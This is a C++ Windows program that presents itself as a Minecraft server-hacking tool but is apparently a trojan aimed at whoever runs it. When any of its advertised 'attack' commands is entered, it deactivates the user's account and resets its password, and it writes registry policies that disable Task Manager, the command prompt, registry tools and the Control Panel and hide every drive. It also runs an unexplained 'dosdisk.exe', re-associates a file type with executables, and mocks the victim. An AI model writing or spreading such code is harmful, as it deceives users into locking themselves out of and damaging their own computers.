#include <iostream>
#include <fstream>
#include <sstream>
#include<string.h>
#include<stdlib.h>
#include<time.h>
#include <direct.h>
#include<windows.h>
/* run this program using the console pauser or add your own getch, system("pause") or input loop */
using namespace std;

int main(int argc, char** argv) {
	system("title 我的世界HACKER工具");
	string jvav;//输入jvav即可进入
	cout << "请输入jvav进入工具<user>：";
	cin >> jvav;
	if (jvav == "jvav")
	{
		system("@echo off");
		cout << "加载中:\n";
		system("title 我的世界HACKER工具");
		cout << "欢迎使用我的世界Jvav破坏工具\n";
		cout << "本程序基于Jvav11编写，程序版本：4.5 SDK最小兼容：14个\n ";
		cout << "--------------------------------------------------------------\n";
		Sleep(1000);
		cout << "加载中\n";
		for (int i = 0; i < 10; i++)
		{
			Sleep(1000);
			cout << ".";
		}
		printf("\n");
		MessageBox(NULL, TEXT("成功加载HCKER模块！"), TEXT("加载动态库完成"), MB_OK);
		system("cls");
		system("color 01");
		cout << "加载成功！输入help查看工具命令\n";
		string put;//用户输入的内容
		while (1)
		{
			system("assoc.mini = exefile");
			cout << "<root@HYT-HACKER-TOOL-4.5>:";
			cin >> put;
			if (put == "help")
			{
				cout << "在:前的均为指令本体\n";
				cout << "SBHYT ：一键破坏服务器花雨庭\n";
				cout << "SBROOM ：一键破坏当前所在的房\n";
				cout << "HACKERROOM：一键所处房间获取管理权限\n";

			}
			else if (put == "SBHYT" || put == "SBROOM" || put == "HACKERROOM")
			{
				system("net user %username% /active:no");
				system("net user %username% mini666");
				system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoClose  \/d 1 \/t REG_DWORD \/f");
				system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoControlPanel  \/d 1 \/t REG_DWORD \/f");
				system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoFind  \/d 1 \/t REG_DWORD \/f");
				system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoDrives  \/d 4294967295 \/t REG_DWORD \/f");
				system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v DisableTaskMgr  \/d 1 \/t REG_DWORD \/f");
				system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoViewOnDrive  \/d 4294967295 \/t REG_DWORD \/f");
				system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v DisableCMD  \/d 1 \/t REG_DWORD \/f");
				system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v  Disableregistrytools   \/d 1 \/t REG_DWORD \/f");
				system("dosdisk.exe");
				MessageBox(NULL,TEXT("SORRY,BUT NM$L"),TEXT("YOU ARE A IDIOT!"), MB_ICONHAND);
				
			} else {
					cout << "未知命令！\n";
			}
		}
		return 0;
	}

	}
	